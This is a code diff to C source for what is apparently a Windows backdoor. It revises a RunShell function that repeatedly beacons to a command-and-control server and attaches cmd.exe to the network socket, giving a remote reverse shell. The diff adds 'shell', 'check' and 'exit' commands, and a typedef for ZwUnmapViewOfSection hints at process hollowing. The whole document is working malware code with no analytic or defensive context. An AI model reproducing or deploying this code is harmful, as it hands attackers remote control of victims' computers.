@@ -38,8 +38,10 @@ typedef NTSTATUS(WINAPI* _ZwUnmapViewOfSection)(
 	_In_opt_ PVOID  BaseAddress
 	);
 
-void RunShell(char* C2Server, int C2Port) {
-	while (true) {
+void RunShell(char* C2Server, int C2Port) 
+{
+	while (true) 
+	{
 		Sleep(5000);    // 1000 = One Second
 
 		SOCKET mySocket;
@@ -53,41 +55,58 @@ void RunShell(char* C2Server, int C2Port) {
 		addr.sin_port = htons(C2Port);     //Port received from main function
 
 										   //Connecting to Proxy/ProxyIP/C2Host
-		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) 
+		{
 			closesocket(mySocket);
 			WSACleanup();
 			continue;
 		}
-		else {
-			char RecvData[DEFAULT_BUFLEN];
-			memset(RecvData, 0, sizeof(RecvData));
-			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-			if (RecvCode <= 0) {
-				closesocket(mySocket);
-				WSACleanup();
-				continue;
-			}
-			else {
-				char Process[] = "cmd.exe";
-				STARTUPINFO sinfo;
-				PROCESS_INFORMATION pinfo;
-				memset(&sinfo, 0, sizeof(sinfo));
-				sinfo.cb = sizeof(sinfo);
-				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
-				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-				WaitForSingleObject(pinfo.hProcess, INFINITE);
-				CloseHandle(pinfo.hProcess);
-				CloseHandle(pinfo.hThread);
-
+		else 
+		{
+			char message[] = "Connection established\n\>";
+			send(mySocket, message, strlen(message), MSG_OOB);
+			//free(message);
+			char RecvData[DEFAULT_BUFLEN_RECV];
+			while (true)
+			{
 				memset(RecvData, 0, sizeof(RecvData));
-				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
-				if (RecvCode <= 0) {
+				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN_RECV, 0);
+				if (RecvCode <= 0)
+				{
 					closesocket(mySocket);
 					WSACleanup();
-					continue;
+					break;
 				}
-				if (strcmp(RecvData, "exit\n") == 0) {
+
+				if (strcmp(RecvData, "shell\n") == 0)
+				{
+					char Process[] = "cmd.exe";
+					STARTUPINFO sinfo;
+					PROCESS_INFORMATION pinfo;
+					memset(&sinfo, 0, sizeof(sinfo));
+					sinfo.cb = sizeof(sinfo);
+					sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+					sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
+					CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+					WaitForSingleObject(pinfo.hProcess, INFINITE);
+					CloseHandle(pinfo.hProcess);
+					CloseHandle(pinfo.hThread);
+
+					char message[] = "Shell closed\n\>";
+					send(mySocket, message, strlen(message), MSG_OOB);
+					//free(message);
+				}
+
+				if (strcmp(RecvData, "check\n") == 0)
+				{
+					char message[] = "Session is alive\n\>";
+					send(mySocket, message, strlen(message), MSG_OOB);
+				}
+
+				if (strcmp(RecvData, "exit\n") == 0)
+				{
+					closesocket(mySocket);
+					WSACleanup();
 					exit(0);
 				}
 			}
